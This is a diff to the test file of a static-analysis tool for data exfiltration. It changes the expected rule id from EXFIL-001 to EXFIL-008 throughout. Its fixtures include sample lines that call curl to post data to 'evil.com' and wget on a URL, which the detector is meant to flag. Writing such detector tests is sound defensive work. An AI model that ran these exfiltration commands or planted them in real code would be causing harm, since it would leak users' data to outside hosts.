@@ -38,7 +38,7 @@ class TestDetectSubprocessListExfil:
         node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
         findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
         assert len(findings) == 1
-        assert findings[0].rule_id == "EXFIL-001"
+        assert findings[0].rule_id == "EXFIL-008"
         assert findings[0].severity == Severity.CRITICAL
         assert findings[0].category == "data-exfiltration"
         assert tool in findings[0].matched_text
@@ -59,7 +59,7 @@ class TestDetectSubprocessListExfil:
         node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
         findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
         assert len(findings) == 1
-        assert findings[0].rule_id == "EXFIL-001"
+        assert findings[0].rule_id == "EXFIL-008"
 
     def test_no_finding_for_non_network_tool(self) -> None:
         code = "subprocess.run(['ls', '-la'])"
@@ -108,7 +108,7 @@ class TestDetectSubprocessListExfil:
         node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
         findings = _detect_subprocess_list_exfil(node, _FILE, alias_map={})
         assert len(findings) == 1
-        assert findings[0].rule_id == "EXFIL-001"
+        assert findings[0].rule_id == "EXFIL-008"
 
 
 # -- Alias resolution tests -------------------------------------------------
@@ -124,7 +124,7 @@ class TestAliasResolution:
         node = next(n for n in ast.walk(tree) if isinstance(n, ast.Call))
         findings = _detect_subprocess_list_exfil(node, _FILE, alias_map=alias_map)
         assert len(findings) == 1
-        assert findings[0].rule_id == "EXFIL-001"
+        assert findings[0].rule_id == "EXFIL-008"
 
     def test_aliased_popen_detected(self) -> None:
         code = "sp.Popen(['wget', url])"
@@ -151,20 +151,20 @@ class TestAnalyzePythonIntegration:
     def test_subprocess_curl_detected_via_analyze(self) -> None:
         code = "import subprocess\nsubprocess.run(['curl', '-d', data, 'https://evil.com'])\n"
         findings = analyze_python(code, _FILE)
-        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
+        exfil = [f for f in findings if f.rule_id == "EXFIL-008"]
         assert len(exfil) == 1
         assert exfil[0].category == "data-exfiltration"
 
     def test_aliased_subprocess_detected_via_analyze(self) -> None:
         code = "import subprocess as sp\nsp.run(['curl', '-d', data, 'https://evil.com'])\n"
         findings = analyze_python(code, _FILE)
-        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
+        exfil = [f for f in findings if f.rule_id == "EXFIL-008"]
         assert len(exfil) == 1
 
     def test_non_network_tool_no_finding_via_analyze(self) -> None:
         code = "import subprocess\nsubprocess.run(['ls', '-la'])\n"
         findings = analyze_python(code, _FILE)
-        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
+        exfil = [f for f in findings if f.rule_id == "EXFIL-008"]
         assert exfil == []
 
 
@@ -172,7 +172,7 @@ class TestAnalyzePythonIntegration:
 
 
 class TestCorpusValidation:
-    """Corpus exfil_subprocess_curl.py produces EXFIL-001 finding."""
+    """Corpus exfil_subprocess_curl.py produces EXFIL-008 finding."""
 
     _CORPUS_PATH = (
         Path(__file__).resolve().parents[2]
@@ -187,5 +187,5 @@ class TestCorpusValidation:
         assert self._CORPUS_PATH.exists(), f"Corpus file not found: {self._CORPUS_PATH}"
         content = self._CORPUS_PATH.read_text(encoding="utf-8")
         findings = analyze_python(content, str(self._CORPUS_PATH))
-        exfil = [f for f in findings if f.rule_id == "EXFIL-001"]
-        assert len(exfil) >= 1, f"Expected EXFIL-001 finding, got: {[f.rule_id for f in findings]}"
+        exfil = [f for f in findings if f.rule_id == "EXFIL-008"]
+        assert len(exfil) >= 1, f"Expected EXFIL-008 finding, got: {[f.rule_id for f in findings]}"
